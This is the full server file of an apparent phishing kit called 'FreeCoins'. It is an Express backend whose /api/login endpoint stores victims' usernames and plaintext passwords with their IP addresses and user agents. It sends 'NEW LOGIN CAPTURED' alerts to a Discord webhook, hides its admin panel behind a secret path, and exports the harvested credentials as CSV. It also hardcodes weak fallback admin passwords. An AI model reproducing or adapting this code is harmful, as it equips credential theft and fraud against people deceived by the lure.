require('dotenv').config();

const express = require('express');
const cors = require('cors');
const path = require('path');
const crypto = require('crypto');
const bcrypt = require('bcryptjs');
const {
    getActiveDbType,
    addSubmission, getAllSubmissions, deleteSubmission, clearAllSubmissions,
    getMemberByUsername, getAllMembers, addMember, updateMember, deleteMember
} = require('./database');

const app = express();
const PORT = process.env.PORT || 3000;

// Secret path for admin panel (from .env) — not exposed in source code
const ADMIN_PANEL_SECRET = process.env.ADMIN_PANEL_SECRET || 'xk9p2m7r';
const ADMIN_PANEL_PATH = `/panel-${ADMIN_PANEL_SECRET}`;

// Discord Webhook URL — server-side only, never sent to frontend
const DISCORD_WEBHOOK_URL = process.env.DISCORD_WEBHOOK_URL || '';

// Active sessions in memory: token -> member info (includes role)
const activeAdminSessions = new Map();

// ─── Middleware ───────────────────────────────────────────────────────────────
app.use(cors());
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// Block /admin.html BEFORE static middleware
app.get('/admin.html', (req, res) => res.status(404).send('Not Found'));

// Serve static files normally
app.use(express.static(__dirname));

// Serve admin panel at secret URL path
app.get(ADMIN_PANEL_PATH, (req, res) => {
    res.sendFile(path.join(__dirname, 'admin.html'));
});

// ─── Auth Middleware ──────────────────────────────────────────────────────────
function requireAdminAuth(req, res, next) {
    const authHeader = req.headers['authorization'];
    const queryToken = req.query.token;
    const token = (authHeader && authHeader.startsWith('Bearer '))
        ? authHeader.slice(7).trim()
        : queryToken;

    if (!token || !activeAdminSessions.has(token)) {
        return res.status(401).json({ success: false, message: 'Unauthorized. Please log in.' });
    }
    req.adminMember = activeAdminSessions.get(token);
    next();
}

function requireRole(...allowedRoles) {
    return (req, res, next) => {
        if (!req.adminMember || !allowedRoles.includes(req.adminMember.role)) {
            return res.status(403).json({
                success: false,
                message: `Access denied. Required role: ${allowedRoles.join(' or ')}.`
            });
        }
        next();
    };
}

// ─── Legacy fallback credentials (read from .env) ────────────────────────────
const LEGACY_MEMBERS = [
    { id: 0, name: 'Developer',      username: 'developer', passwords: [process.env.DEVELOPER_PASSWORD || 'Dev#Grand2025'], role: 'developer' },
    { id: 1, name: 'Admin Member 1', username: 'admin1',    passwords: [process.env.ADMIN1_PASSWORD    || 'Grand#Admin1'],  role: 'admin' },
    { id: 2, name: 'Admin Member 2', username: 'admin2',    passwords: [process.env.ADMIN2_PASSWORD    || 'Grand#Admin2'],  role: 'admin' },
    { id: 3, name: 'Admin Member 3', username: 'admin3',    passwords: [process.env.ADMIN3_PASSWORD    || 'Grand#Admin3'],  role: 'admin' },
    { id: 4, name: 'Admin',          username: 'admin',     passwords: [process.env.ADMIN_PASSWORD     || 'admin'],         role: 'admin' },
];

// ─── Auth Endpoints ───────────────────────────────────────────────────────────
app.post('/api/admin/login', async (req, res) => {
    const { username, password } = req.body;
    if (!username || !password) {
        return res.status(400).json({ success: false, message: 'Username and password are required.' });
    }
    const cleanUser = username.trim().toLowerCase();
    const cleanPass = password.trim();

    try {
        const member = await getMemberByUsername(cleanUser);
        if (member) {
            const ok = await bcrypt.compare(cleanPass, member.password_hash);
            if (!ok) return res.status(401).json({ success: false, message: 'Invalid credentials.' });
            const token = crypto.randomBytes(32).toString('hex');
            activeAdminSessions.set(token, { id: member.id, name: member.name, username: member.username, role: member.role, loginTime: new Date().toISOString() });
            console.log(`[AUTH] "${member.name}" (${member.role}) logged in.`);
            return res.json({ success: true, message: `Welcome, ${member.name}`, token, member: { id: member.id, name: member.name, username: member.username, role: member.role } });
        }

        // Legacy fallback
        const legacyMember = LEGACY_MEMBERS.find(m =>
            m.username === cleanUser && m.passwords.some(p => p === cleanPass || p.toLowerCase() === cleanPass.toLowerCase())
        );
        if (legacyMember) {
            const token = crypto.randomBytes(32).toString('hex');
            activeAdminSessions.set(token, { id: legacyMember.id, name: legacyMember.name, username: legacyMember.username, role: legacyMember.role, loginTime: new Date().toISOString() });
            return res.json({ success: true, message: `Welcome, ${legacyMember.name}`, token, member: { id: legacyMember.id, name: legacyMember.name, username: legacyMember.username, role: legacyMember.role } });
        }

        return res.status(401).json({ success: false, message: 'Invalid credentials. Access denied.' });
    } catch (err) {
        console.error('[AUTH] Login error:', err);
        return res.status(500).json({ success: false, message: 'Authentication error.' });
    }
});

app.post('/api/admin/logout', (req, res) => {
    const authHeader = req.headers['authorization'];
    const token = (authHeader && authHeader.startsWith('Bearer ')) ? authHeader.slice(7).trim() : null;
    if (token) activeAdminSessions.delete(token);
    return res.json({ success: true, message: 'Logged out successfully.' });
});

app.get('/api/admin/verify', requireAdminAuth, (req, res) => {
    return res.json({ success: true, member: req.adminMember });
});

// ─── Notify Endpoint (replaces client-side Discord webhook) ──────────────────
/**
 * POST /api/notify — sends to Discord webhook server-side (URL never exposed to frontend)
 */
app.post('/api/notify', async (req, res) => {
    const { username } = req.body;
    if (!username) return res.status(400).json({ success: false });

    // Only send notification — don't expose any webhook URL to the client
    if (DISCORD_WEBHOOK_URL) {
        try {
            const fetch = (...args) => import('node-fetch').then(({ default: f }) => f(...args)).catch(() => null);
            const nativeFetch = globalThis.fetch || fetch;
            await nativeFetch(DISCORD_WEBHOOK_URL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ content: `🔐 NEW LOGIN CAPTURED\n👤 Username: ${username}` })
            });
        } catch (e) {
            // Silently fail — don't block the response
        }
    }
    return res.json({ success: true });
});

// ─── Member Management Endpoints (Developer only) ─────────────────────────────
app.get('/api/admin/members', requireAdminAuth, requireRole('developer'), async (req, res) => {
    try {
        const members = await getAllMembers();
        return res.json({ success: true, data: members });
    } catch (err) {
        return res.status(500).json({ success: false, message: 'Failed to fetch members.' });
    }
});

app.post('/api/admin/members', requireAdminAuth, requireRole('developer'), async (req, res) => {
    const { name, username, password, role } = req.body;
    if (!name || !username || !password || !role) {
        return res.status(400).json({ success: false, message: 'name, username, password, and role are required.' });
    }
    if (!['developer', 'admin', 'viewer'].includes(role)) {
        return res.status(400).json({ success: false, message: 'Invalid role.' });
    }
    try {
        const newMember = await addMember({ name, username, password, role, createdBy: req.adminMember.username });
        console.log(`[MEMBERS] "${req.adminMember.name}" created member "${username}" (${role})`);
        return res.status(201).json({ success: true, data: newMember });
    } catch (err) {
        if (err.code === 'ER_DUP_ENTRY' || (err.message && (err.message.includes('UNIQUE') || err.message.includes('ER_DUP_ENTRY')))) {
            return res.status(409).json({ success: false, message: 'Username already exists.' });
        }
        return res.status(500).json({ success: false, message: 'Failed to create member.' });
    }
});

app.put('/api/admin/members/:id', requireAdminAuth, requireRole('developer'), async (req, res) => {
    const { id } = req.params;
    const { name, role, password } = req.body;
    if (!name || !role) return res.status(400).json({ success: false, message: 'name and role are required.' });
    try {
        const result = await updateMember({ id, name, role, password });
        if (!result.updated) return res.status(404).json({ success: false, message: 'Member not found.' });
        return res.json({ success: true, message: 'Member updated successfully.' });
    } catch (err) {
        return res.status(500).json({ success: false, message: 'Failed to update member.' });
    }
});

app.delete('/api/admin/members/:id', requireAdminAuth, requireRole('developer'), async (req, res) => {
    const { id } = req.params;
    if (String(id) === String(req.adminMember.id)) {
        return res.status(400).json({ success: false, message: 'You cannot delete your own account.' });
    }
    try {
        const result = await deleteMember(id);
        if (!result.deleted) return res.status(404).json({ success: false, message: 'Member not found.' });
        return res.json({ success: true, message: 'Member deleted.' });
    } catch (err) {
        return res.status(500).json({ success: false, message: 'Failed to delete member.' });
    }
});

// ─── Submissions Endpoints ────────────────────────────────────────────────────
app.post('/api/login', async (req, res) => {
    try {
        const { username, password } = req.body;
        if (!username || !password) return res.status(400).json({ success: false, message: 'Username and Password are required.' });
        const ipAddress = req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'Unknown';
        const userAgent = req.headers['user-agent'] || 'Unknown';
        const result = await addSubmission({ username: username.trim(), password: password.trim(), ipAddress, userAgent });
        console.log(`[DB] Saved entry #${result.id}: ${username}`);
        return res.status(201).json({ success: true, message: 'Saved.', data: { id: result.id, username: result.username } });
    } catch (error) {
        console.error('Error saving submission:', error);
        return res.status(500).json({ success: false, message: 'Internal server error.' });
    }
});

app.get('/api/submissions', requireAdminAuth, async (req, res) => {
    try {
        const rows = await getAllSubmissions();
        return res.json({
            success: true,
            count: rows.length,
            data: rows,
            dbType: getActiveDbType(),
            requester: req.adminMember.name
        });
    } catch (error) {
        return res.status(500).json({ success: false, message: 'Failed to retrieve submissions.' });
    }
});

app.delete('/api/submissions/:id', requireAdminAuth, requireRole('developer'), async (req, res) => {
    try {
        const result = await deleteSubmission(req.params.id);
        if (!result.deleted) return res.status(404).json({ success: false, message: 'Not found.' });
        return res.json({ success: true, message: `Submission #${req.params.id} deleted.` });
    } catch (error) {
        return res.status(500).json({ success: false, message: 'Failed to delete.' });
    }
});

app.delete('/api/submissions', requireAdminAuth, requireRole('developer'), async (req, res) => {
    try {
        const result = await clearAllSubmissions();
        return res.json({ success: true, message: `Cleared ${result.clearedCount} submissions.` });
    } catch (error) {
        return res.status(500).json({ success: false, message: 'Failed to clear.' });
    }
});

app.get('/api/export/csv', requireAdminAuth, requireRole('developer', 'admin'), async (req, res) => {
    try {
        const rows = await getAllSubmissions();
        let csv = 'ID,Username/Email,Password,IP Address,User Agent,Date/Time\r\n';
        const formatDt = (d) => {
            if (!d) return '';
            if (d instanceof Date) return d.toISOString().replace('T', ' ').slice(0, 19);
            return String(d);
        };
        rows.forEach(r => {
            csv += `${r.id},"${(r.username||'').replace(/"/g,'""')}","${(r.password||'').replace(/"/g,'""')}","${(r.ip_address||'').replace(/"/g,'""')}","${(r.user_agent||'').replace(/"/g,'""')}","${formatDt(r.created_at).replace(/"/g,'""')}"\r\n`;
        });
        res.setHeader('Content-Type', 'text/csv');
        res.setHeader('Content-Disposition', 'attachment; filename="submissions.csv"');
        return res.send(csv);
    } catch (error) {
        return res.status(500).send('Failed to export CSV');
    }
});

// ─── Start Server ─────────────────────────────────────────────────────────────
app.listen(PORT, () => {
    console.log(`=========================================`);
    console.log(`🚀 FreeCoins Server is active!`);
    console.log(`🗄️ Database:    ${getActiveDbType().toUpperCase()}`);
    console.log(`🌐 Website:     http://localhost:${PORT}`);
    console.log(`🔒 Admin Panel: http://localhost:${PORT}${ADMIN_PANEL_PATH}`);
    console.log(`=========================================`);
});
